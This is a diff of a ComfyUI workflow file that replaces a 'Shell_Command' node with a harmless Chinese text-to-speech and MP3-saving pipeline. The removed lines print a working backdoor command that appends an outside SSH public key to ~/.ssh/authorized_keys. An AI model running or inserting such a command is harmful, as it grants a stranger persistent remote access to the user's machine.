@@ -1,18 +1,67 @@
 {
-  "1": {
-    "class_type": "Shell_Command",
+  "28": {
+    "class_type": "KokoroZHRun",
     "inputs": {
-      "command": "mkdir -p ~/.ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo1frEqus9wJL5gLL3PJrZ5yE6tYGc1jgUBNf/0nX58D1jDKNu8o2DghISnmC3Vb6KONfzNaQ4H7Z311e2t47hE1AvwCzjDZJETMo8bsVU20UhqqRS5cJzxh0z5ho1rQ7qTWXqelreiU2Z5CJX2PNFaDUjVqmjIYrWX0A5naMS29UlRhAoZdJUpJiL1wfdS6Y2NCI0OdSLqNBMq5diOiR6hi+aCcssgt55A6Nq6crukMHeLk5cDBa61VZPfloHoA1TYjo47kdzpzH5ws5NQSQjb4cSt5ufU/hGodYh1HQ835KgJuL2QOfHfkSCsON4qK/Evwyy9sRWd7+OaOsOziEH dor@DESKTOP-D69V6BP\" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && chmod 700 ~/.ssh && echo DONE",
-      "params": ""
-    }
-  },
-  "2": {
-    "class_type": "PreviewAny",
-    "inputs": {
-      "source": [
-        "1",
+      "voice": "zm_013.pt",
+      "voice_s2": "zf_001.pt",
+      "unload_model": true,
+      "enable_dialogue": false,
+      "text": [
+        "32",
         0
       ]
+    },
+    "_meta": {
+      "title": "Kokoro ZH Run"
+    }
+  },
+  "30": {
+    "class_type": "SaveAudioMP3",
+    "inputs": {
+      "filename_prefix": "503c0f5a5b25456e886fc9edb37199a6/503c0f5a5b25456e886fc9edb37199a6",
+      "audio": [
+        "28",
+        0
+      ],
+      "audioUI": "/api/view?filename=ComfyUI_00019_.mp3&type=output&subfolder=audio&rand=0.6467680289380505",
+      "quality": "V0"
+    },
+    "_meta": {
+      "title": "保存音频 (MP3)"
+    }
+  },
+  "41": {
+    "class_type": "PrimitiveString",
+    "inputs": {
+      "value": "一只小狗在打滚"
+    },
+    "_meta": {
+      "title": "字符串"
+    }
+  },
+  "31": {
+    "class_type": "Seed (rgthree)",
+    "inputs": {
+      "seed": -1
+    },
+    "_meta": {
+      "title": "随机种"
+    }
+  },
+  "32": {
+    "class_type": "Text Random Line",
+    "inputs": {
+      "seed": [
+        "31",
+        0
+      ],
+      "text": [
+        "41",
+        0
+      ]
+    },
+    "_meta": {
+      "title": "文本随机行"
     }
   }
 }
